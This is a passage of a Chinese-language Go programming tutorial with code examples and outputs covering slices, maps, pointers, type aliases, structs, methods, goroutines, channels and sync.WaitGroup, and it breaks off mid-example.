<h4 id="切片的添加与删除">1.4.3.3. 切片的添加与删除</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s1 = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	<span class="comment">// 增加 append(slice, num)</span></span><br><span class="line">	s1 = <span class="built_in">append</span>(s1, <span class="number">100</span>)</span><br><span class="line">	fmt.Println(s1)</span><br><span class="line">	<span class="comment">// 截取、拼接、覆盖=删除 append(数组的部分切片[,数组的部分切片]...) 覆盖原来的值</span></span><br><span class="line">	s1 = <span class="built_in">append</span>(s1[:<span class="number">2</span>], s1[<span class="number">3</span>:]...) <span class="comment">//[1,2,4,100]</span></span><br><span class="line">	fmt.Println(s1)</span><br><span class="line">	<span class="comment">// 数组的拷贝</span></span><br><span class="line">	s2 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	<span class="comment">// 直接赋值为浅拷贝，指向同一个内存地址，其中一个修改之后另一个也修改</span></span><br><span class="line">	s3 := s2</span><br><span class="line">	<span class="keyword">var</span> s4 = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">4</span>) <span class="comment">// 引用类型必须要make进行初始化</span></span><br><span class="line">	<span class="comment">// copy为深拷贝，重新开辟一块内存空间，互不影响</span></span><br><span class="line">	<span class="built_in">copy</span>(s4, s2)</span><br><span class="line">	s3[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">	fmt.Println(s2)</span><br><span class="line">	fmt.Println(s3)</span><br><span class="line">	fmt.Println(s4)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221122214400958.png" alt="image-20221122214400958"></p>
<h3 id="map">1.4.4. map</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">map_variable = <span class="built_in">make</span>(<span class="keyword">map</span>[key_data_type]value_data_type</span><br><span class="line"></span><br><span class="line">map_variable: <span class="keyword">map</span>变量名称</span><br><span class="line">key_data_type : key的数据类型</span><br><span class="line">value_data_type : 值得数据类型</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 使用make初始化</span></span><br><span class="line">	m1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span><br><span class="line">	m1[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;tom&quot;</span></span><br><span class="line">	m1[<span class="string">&quot;age&quot;</span>] = <span class="string">&quot;18&quot;</span></span><br><span class="line">	m1[<span class="string">&quot;mail&quot;</span>] = <span class="string">&quot;123@qq.com&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 直接初始化赋值</span></span><br><span class="line">	m2 := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;name&quot;</span>: <span class="string">&quot;july&quot;</span>,</span><br><span class="line">		<span class="string">&quot;age&quot;</span>:  <span class="string">&quot;18&quot;</span>,</span><br><span class="line">		<span class="string">&quot;mail&quot;</span>: <span class="string">&quot;223@qq.com&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(m1)</span><br><span class="line">	fmt.Println(m2)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过key获取value</span></span><br><span class="line">	fmt.Println(m1[<span class="string">&quot;name&quot;</span>])</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 判断map中的key是否存在</span></span><br><span class="line">	v, ok := m1[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">	v1, ok1 := m1[<span class="string">&quot;tom&quot;</span>]</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%v,%v\n&quot;</span>, v, ok)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%v,%v&quot;</span>, v1, ok1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221122215737309.png" alt="image-20221122215737309"></p>
<h4 id="map的遍历">1.4.4.1. map的遍历</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	m1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span><br><span class="line">	m1[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;tom&quot;</span></span><br><span class="line">	m1[<span class="string">&quot;age&quot;</span>] = <span class="string">&quot;18&quot;</span></span><br><span class="line">	m1[<span class="string">&quot;mail&quot;</span>] = <span class="string">&quot;123@qq.com&quot;</span></span><br><span class="line">	<span class="keyword">for</span> key, value := <span class="keyword">range</span> m1 &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%v:%v\n&quot;</span>, key, value)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221122215959858.png" alt="image-20221122215959858"></p>
<h2 id="指针">1.5. 指针</h2><p>Go语言中的函数传参都是值拷贝，当我们想要修改某个变量的时候，我们可以创建一个指向该变量地址的指针变量。传递数据使用指针，而无须拷贝数据。<br>类型指针不能进行偏移和运算。<br>Go语言中的指针操作非常简单，只需要记住两个符号:&amp;(取地址)和*(根据地址取值)。</p>
<h3 id="指针的声明">1.5.1. 指针的声明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var var_name *var_type</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 指针的声明</span></span><br><span class="line">	<span class="keyword">var</span> p *<span class="type">int</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;p:%v\n&quot;</span>, p) <span class="comment">// nil 空指针</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;p:%T\n&quot;</span>, p)</span><br><span class="line">	<span class="comment">// 指针的赋值</span></span><br><span class="line">	i := <span class="number">100</span></span><br><span class="line">	p = &amp;i</span><br><span class="line">	fmt.Printf(<span class="string">&quot;p:%v\n&quot;</span>, p)  <span class="comment">// 取地址</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;p:%v&quot;</span>, *p) <span class="comment">// 取值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">p:&lt;<span class="literal">nil</span>&gt;</span><br><span class="line">p:*<span class="type">int</span></span><br><span class="line">p:<span class="number">0xc00001c100</span></span><br><span class="line">p:<span class="number">100</span></span><br></pre></td></tr></table></figure>

<h3 id="指向数组的指针">1.5.2. 指向数组的指针</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pa [max]*<span class="type">int</span></span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := [...]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">	<span class="keyword">const</span> MAX = <span class="built_in">len</span>(a)</span><br><span class="line">	<span class="keyword">var</span> pa [MAX]*<span class="type">int</span></span><br><span class="line">	fmt.Println(pa)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; MAX; i++ &#123;</span><br><span class="line">		pa[i] = &amp;a[i]</span><br><span class="line">		fmt.Printf(<span class="string">&quot;pa[%d]%v\n&quot;</span>, i, *pa[i])</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(pa)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">[&lt;<span class="literal">nil</span>&gt; &lt;<span class="literal">nil</span>&gt; &lt;<span class="literal">nil</span>&gt; &lt;<span class="literal">nil</span>&gt; &lt;<span class="literal">nil</span>&gt;]</span><br><span class="line">pa[<span class="number">0</span>]<span class="number">1</span></span><br><span class="line">pa[<span class="number">1</span>]<span class="number">2</span></span><br><span class="line">pa[<span class="number">2</span>]<span class="number">3</span></span><br><span class="line">pa[<span class="number">3</span>]<span class="number">4</span></span><br><span class="line">pa[<span class="number">4</span>]<span class="number">5</span></span><br><span class="line">[<span class="number">0xc00000e360</span> <span class="number">0xc00000e368</span> <span class="number">0xc00000e370</span> <span class="number">0xc00000e378</span> <span class="number">0xc00000e380</span>]</span><br></pre></td></tr></table></figure>

<h2 id="类型">1.6. 类型</h2><h3 id="类型定义">1.6.1. 类型定义</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> newType <span class="keyword">type</span></span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 类型定义</span></span><br><span class="line">	<span class="keyword">type</span> MyInt <span class="type">int</span></span><br><span class="line">	<span class="keyword">var</span> i MyInt = <span class="number">100</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%v&quot;</span>, i, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main.MyInt,100</span><br></pre></td></tr></table></figure>

<h3 id="类型别名">1.6.2. 类型别名</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 类型别名</span></span><br><span class="line">	<span class="keyword">type</span> I = <span class="type">int</span></span><br><span class="line">	<span class="keyword">var</span> i1 I = <span class="number">120</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T,%v&quot;</span>, i1, i1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int,120</span><br></pre></td></tr></table></figure>

<h3 id="类型定义和类型别名的区别">1.6.3. 类型定义和类型别名的区别</h3><ul>
<li><p>类型定义相当于定义了一个<strong>全新的类型</strong>与之前的类型不同;但是类型别名并没有定义一个新的类型，而是使用一个别名来替换之前的类型</p>
</li>
<li><p>类型别名只会在<strong>代码</strong>中存在，在<strong>编译完成</strong>之后并不会存在该别名</p>
</li>
<li><p>因为类型别名和原来的类型是一致的，所以原来类型所拥有的方法，类型别名中也可以调用，但是如果是重3新定义的一个类型，那么不可以调用之前的任何方法</p>
</li>
</ul>
<h2 id="结构体（struct）">1.7. 结构体（struct）</h2><h3 id="结构体定义">1.7.1. 结构体定义</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> struct_name <span class="keyword">struct</span> &#123;</span><br><span class="line">	var1_name var1_type</span><br><span class="line">    var2_name var2_type</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="声明结构体变量">1.7.2. 声明结构体变量</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> students <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">	age  <span class="type">int</span></span><br><span class="line">	sex  <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s1 students</span><br><span class="line">	s1.sex = <span class="literal">false</span></span><br><span class="line">	s1.name = <span class="string">&quot;tom&quot;</span></span><br><span class="line">	s1.age = <span class="number">18</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;s1: %v&quot;</span>, s1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s1: &#123;tom 18 false&#125;</span><br></pre></td></tr></table></figure>

<h3 id="匿名结构体">1.7.3. 匿名结构体</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 匿名结构体</span></span><br><span class="line">	<span class="keyword">var</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">		email <span class="type">string</span></span><br><span class="line">		age   <span class="type">int</span></span><br><span class="line">		name  <span class="type">string</span></span><br><span class="line">	&#125;</span><br><span class="line">	person.email = <span class="string">&quot;123@qq.com&quot;</span></span><br><span class="line">	fmt.Println(person.email)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123@qq.com</span><br></pre></td></tr></table></figure>

<h3 id="结构体的初始化">1.7.4. 结构体的初始化</h3><ol>
<li>通过键值对的方式赋值</li>
<li>使用值的列表初始化</li>
<li>成员部分初始化必须使用方式1通过键值对的方式赋值</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">	id, age     <span class="type">int</span></span><br><span class="line">	name, email <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 1.通过键值对的方式赋值</span></span><br><span class="line">	<span class="keyword">var</span> p1 = person&#123;</span><br><span class="line">		id:    <span class="number">001</span>,</span><br><span class="line">		age:   <span class="number">18</span>,</span><br><span class="line">		name:  <span class="string">&quot;kali&quot;</span>,</span><br><span class="line">		email: <span class="string">&quot;123@qq.com&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;p1:%v\n&quot;</span>, p1)</span><br><span class="line">	<span class="comment">// 2.使用值的列表初始化</span></span><br><span class="line">	p2 := person&#123;</span><br><span class="line">		<span class="number">002</span>,</span><br><span class="line">		<span class="number">18</span>,</span><br><span class="line">		<span class="string">&quot;kate&quot;</span>,</span><br><span class="line">		<span class="string">&quot;123124@qq.com&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;p2:%v&quot;</span>, p2)</span><br><span class="line">	<span class="comment">// 3.成员部分初始化必须使用方式1通过键值对的方式赋值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结构体指针">1.7.5. 结构体指针</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">		id   <span class="type">int</span></span><br><span class="line">		name <span class="type">string</span></span><br><span class="line">		age  <span class="type">int</span></span><br><span class="line">	&#125;</span><br><span class="line">	tom := person&#123;</span><br><span class="line">		<span class="number">001</span>,</span><br><span class="line">		<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">		<span class="number">18</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 定义一个结构体指针</span></span><br><span class="line">	<span class="keyword">var</span> p_person *person</span><br><span class="line"></span><br><span class="line">	p_person = &amp;tom</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, p_person)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, *p_person)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 也可以用new创建一个结构体指针</span></span><br><span class="line">	<span class="keyword">var</span> kate = <span class="built_in">new</span>(person)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, kate)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xc0000523c0</span><br><span class="line">&#123;1 张三 18&#125;</span><br><span class="line">0xc000052420</span><br></pre></td></tr></table></figure>

<h2 id="方法">1.8. 方法</h2><p>go语言没有面向对象的特性，也没有类对象的概念。但是，可以使用结构体来模拟这些特性，我们都知道面向对象里面有类方法等概念。我们也可以声明一些方法，属于某个结构体。</p>
<h3 id="语法">1.8.1. 语法</h3><p>Go中的方法，是一种特殊的函数，定义于struct之上(与struct关联、绑定)，被称为struct的接受者(receiver)。通俗的讲，方法就是有接收者的函数。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> struct_name <span class="keyword">struct</span>&#123;</span><br><span class="line">	var1_name var1_type</span><br><span class="line">    var2_name var2_type</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 该方法属于struct_name这个结构体</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(别名 struct_name)</span></span> func_name (参数) 返回值 &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">	age  <span class="type">int</span></span><br><span class="line">	sex  <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> myfunc() &#123;</span><br><span class="line">	p.age = <span class="number">10</span></span><br><span class="line">	p.name = <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">	p.sex = <span class="literal">true</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;p.age: %v\n&quot;</span>, p.age)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;p.name: %v\n&quot;</span>, p.name)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;p.sex: %v\n&quot;</span>, p.sex)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Person.myfunc(Person&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="接口">1.9. 接口</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221126221151759.png" alt="image-20221126221151759"></p>
<h2 id="并发">1.10. 并发</h2><h3 id="携程">1.10.1. 携程</h3><h4 id="实例1">1.10.1.1. 实例1</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(msg <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;msg: %v\n&quot;</span>, msg)</span><br><span class="line">		time.Sleep(time.Microsecond * <span class="number">100</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 通过go关键字创建携程，通过结果可以观察出两个线程是同时执行的</span></span><br><span class="line">	<span class="keyword">go</span> say(<span class="string">&quot;我在说话&quot;</span>)</span><br><span class="line">	say(<span class="string">&quot;我没说话&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msg: 我没说话</span><br><span class="line">msg: 我在说话</span><br><span class="line">msg: 我没说话</span><br><span class="line">msg: 我在说话</span><br><span class="line">msg: 我在说话</span><br><span class="line">msg: 我没说话</span><br><span class="line">msg: 我没说话</span><br><span class="line">msg: 我在说话</span><br><span class="line">msg: 我在说话</span><br><span class="line">msg: 我没说话</span><br></pre></td></tr></table></figure>

<h4 id="实例2">1.10.1.2. 实例2</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(msg <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;msg: %v\n&quot;</span>, msg)</span><br><span class="line">		time.Sleep(time.Microsecond * <span class="number">100</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 主协程退出后，程序结束</span></span><br><span class="line">	<span class="keyword">go</span> say(<span class="string">&quot;golang&quot;</span>) <span class="comment">// 协程1</span></span><br><span class="line">	<span class="keyword">go</span> say(<span class="string">&quot;python&quot;</span>) <span class="comment">// 协程2</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;end...&quot;</span>) <span class="comment">// 主协程3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果，不唯一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">end...</span><br></pre></td></tr></table></figure>

<h3 id="channel">1.10.2. channel</h3><p>声明，通过make和chan声明,使用完必须用close进行关闭</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var values = make(chan int)</span><br><span class="line">defer close(values)</span><br></pre></td></tr></table></figure>

<p>个人将channel的功能理解为获取函数中的变量值</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建int类型通道，只能传入int类型值</span></span><br><span class="line"><span class="keyword">var</span> values = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">()</span></span> &#123;</span><br><span class="line">	rand.Seed(time.Now().Unix()) <span class="comment">// 指定一个随机数种子，确保每次生成的随机数不同</span></span><br><span class="line">	value := rand.Intn(<span class="number">10</span>)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;send: %v\n&quot;</span>, value)</span><br><span class="line">	values &lt;- value</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		unbuffered := make(chan int)   // 整型无缓冲通道，默认值为0</span></span><br><span class="line"><span class="comment">		buffered := make(chan int, 10) // 整型有缓冲通道</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		go1 := make(chan string, 5) // 创建字符串缓冲通道</span></span><br><span class="line"><span class="comment">		go1 &lt;- &quot;hello&quot;              // 通过通道发送字符串</span></span><br><span class="line"><span class="comment">		data := &lt;-go1 // 从通道接受字符串</span></span><br><span class="line"><span class="comment">		&lt;- 运算符附加到通道变量（go1）的左侧，以接受来自通道的值</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">defer</span> <span class="built_in">close</span>(values) <span class="comment">// 关闭通道，必须！</span></span><br><span class="line">	<span class="keyword">go</span> send()</span><br><span class="line">	fmt.Println(<span class="string">&quot;wait...&quot;</span>)</span><br><span class="line">	value := &lt;-values</span><br><span class="line">	fmt.Printf(<span class="string">&quot;recv: %v\n&quot;</span>, value)</span><br><span class="line">	fmt.Println(<span class="string">&quot;end...&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="waitgroup">1.10.3. waitgroup</h3><p>前</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">showMsg</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;i: %v\n&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> showMsg(i) <span class="comment">// 启动10个协程来执行</span></span><br><span class="line">	&#125;</span><br><span class="line">	wg.Wait()</span><br><span class="line">	<span class="comment">// 因为主协程运行完之后就会关闭程序，其他线程没有运行完会直接终止</span></span><br><span class="line">	<span class="comment">// 所以如果有需要让其他协程执行完需要加waitgroup进行等待</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果，不唯一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">end</span><br><span class="line">i: 7</span><br><span class="line">i: 1</span><br><span class="line">i: 5</span><br><span class="line">i: 4</span><br><span class="line">i: 0</span><br><span class="line">i: 3</span><br><span class="line">i: 6</span><br><span class="line">i: 9</span><br><span class="line">i: 8</span><br><span class="line">i: 2</span><br></pre></td></tr></table></figure>

<p>后</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">showMsg</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">// defer wg.Add(-1) == defer wg.Done()</span></span><br><span class="line">	<span class="keyword">defer</span> wg.Add(<span class="number">-1</span>)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;i: %v\n&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 